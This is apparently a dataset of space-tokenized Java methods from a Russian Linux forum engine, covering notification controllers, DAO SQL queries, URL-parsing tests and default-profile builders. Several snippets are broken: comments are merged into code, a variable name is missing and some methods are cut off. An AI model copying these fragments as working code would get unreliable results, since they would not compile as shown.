public String resetNotifications ( HttpServletRequest request , @RequestParam int topId ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } User currentUser = tmpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , topId ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request , @RequestParam int topId ) { apiController . resetNotifications ( request , topId ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int topics = tmpl . getProf ( ) . getTopics ( ) ; if ( topics > 200 ) { topics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " topics " , topics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , true ) ; long time = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , time + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , true ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , true , topics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , true ) ; params . put ( " topId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " topicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = topics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public static String escapeXml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; if ( " &nbsp; " . equals ( s ) ) { res . append ( " &#160; " ) ; } else { res . append ( s ) ; } i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public void groupsTest ( ) { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . thenReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . getTitle ( ) ) ; } 
public void testMain ( ) { ClientResponse cr = resource . path ( " / " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public static String doLogin ( WebResource resource , String user , String password ) { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; String auth = getAuthCookie ( cr ) ; return auth ; } 
public void testMain ( ) { ClientResponse cr = resource . path ( " /news/archive/2007/5 " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . unblock ( user , user ) ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueJB ( ) ; } 
public void testPage ( ) { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueMaxcom ( ) { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void clean ( ) { rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void testReadEmpty ( ) { profileDao . deleteProfile ( testUser ) ; Profile profile = profileDao . readProfile ( testUser ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser ) ; profileDao . deleteProfile ( testUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , true ) ; messageDao = mock ( TopicDao . class ) ; Topic message1 = mock ( Topic . class ) ; Group group1 = mock ( Group . class ) ; Topic message2 = mock ( Topic . class ) ; Group group2 = mock ( Group . class ) ; Topic message3 = mock ( Topic . class ) ; Group group3 = mock ( Group . class ) ; Topic message12 = mock ( Topic . class ) ; Group group12 = mock ( Group . class ) ; Topic message15 = mock ( Topic . class ) ; Group group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . thenReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . thenReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . thenReturn ( message15 ) ; } 
public void test1 ( ) throws Exception { String url1 = " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test1n ( ) throws Exception { String url1n = " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test2 ( ) throws Exception { String url2 = " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ; LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertFalse ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test3 ( ) throws Exception { String url3 = " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ; LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test4 ( ) throws Exception { not message url String url4 = "https:127.0.0.1:8080/news"; LorURL lorURI = new LorURL(mainURI, url4); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); } 
public void test5 ( ) throws Exception { not lorsource url String url5 = "https:example.com"; LorURL lorURI = new LorURL(mainURI, url5); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertFalse(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); } 
public void test6 ( ) throws Exception { search url String url6 = "http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on"; LorURL lorURI = new LorURL(mainURI, url6); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); assertEquals("https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on", lorURI.canonize(canon)); } 
public void test8 ( ) { boolean result = false ; try { String failurl8 = " some crap " ; LorURL lorURI = new LorURL ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test9 ( ) { boolean result = false ; try { String failurl9 = " " ; LorURL lorURI = new LorURL ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test10 ( ) { boolean result = false ; try { LorURL lorURI = new LorURL ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test11 ( ) { boolean result = false ; try { String failurl11 = " 127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test12 ( ) throws Exception { String url12 = " http:127.0.0.1:8080/forum/security/1948661?lastmod=1319623223360#comment-1948668 " ; LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void undeleteComment ( Comment comment ) { jdbcTemplate . update ( " UPDATE comments SET deleted='f' WHERE id=? " , comment . getId ( ) ) ; } 
public void delete ( int msgid ) { jdbcTemplate . update ( " DELETE FROM del_info WHERE msgid=? " , msgid ) ; } 
public boolean isUndeletable ( Topic topic , Comment comment , @Nullable User user ) { if ( user = = null ) { return false ; } if ( topic . isDeleted ( ) | | ! comment . isDeleted ( ) | | ! user . isModerator ( ) | | topic . isExpired ( ) ) { return false ; } return true ; } 
public CompletionStage < Map < Object , Object > > yearStats ( @PathVariable String nick ) { User user = userService . getUser ( nick ) ; user . checkBlocked ( ) ; return userStatisticsService . getYearStats ( user ) ; } 
public static DateTimeFormatter date ( ) { return DATE ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isOldTracker ( ) { return oldTracker ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isCanBeDefault ( ) { return canBeDefault ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage , group ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; return prepareTopic ( rs , messagesInPage , group ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage , Group group ) { List < TopicsListItem > topicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > tags = topicTagService . getTagsForTitle ( rs . getInt ( " msgid " ) ) ; Timestamp lastmod = rs . getTimestamp ( " lastmod " ) ; TopicsListItem topic = new TopicsListItem ( author , rs . getInt ( " msgid " ) , lastmod , rs . getInt ( " stat1 " ) , group . getId ( ) , group . getTitle ( ) , StringUtil . makeTitle ( rs . getString ( " subj " ) ) , 0 , null , rs . getBoolean ( " resolved " ) , group . getSectionId ( ) , group . getUrlName ( ) , lastmod , false , Topic . getPageCount ( rs . getInt ( " stat1 " ) , messagesInPage ) , tags , rs . getBoolean ( " deleted " ) , rs . getBoolean ( " sticky " ) ) ; topicsList . add ( topic ) ; } return topicsList ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public int doStartTag ( ) { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) : : test ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public List < TopicsListItem > getForGroup ( int groupid , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackAll ( TrackerFilterEnum filter , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } return load ( partFilter , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( text , msgid ) ; return msgid ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } return load ( partFilter , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getGroupTopics ( Group group , int messagesInPage , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { String delq = showDeleted ? " " : " AND NOT deleted " ; String ignq = " " ; String commentIgnq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; commentIgnq = " AND comments.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved, " + " (SELECT max(postdate) FROM comments WHERE topic=topics.id AND NOT comments.deleted " + commentIgnq + " ) as commentdate " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } } return jdbcTemplate . getJdbcOperations ( ) . query ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset , 
public List < TopicsListItem > getGroupStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved, " + " (SELECT max(postdate) FROM comments WHERE topic=topics.id AND NOT comments.deleted) as commentdate " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; return jdbcTemplate . getJdbcOperations ( ) . query ( q , groupListMapper ( group , messagesInPage ) , group . getId ( ) ) ; } 
private RowMapper < TopicsListItem > groupListMapper ( Group group , int messagesInPage ) { return ( rs , rowNum ) - > { User author ; 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public boolean isAllowAnonymous ( ) { return allowAnonymous ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod, allow_anonymous) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . setBoolean ( 10 , msg . isAllowAnonymous ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( text , msgid ) ; return msgid ; } 
public ImageInfo scale ( int maxDimension ) { if ( width < = maxDimension & & height < = maxDimension ) { return this ; 
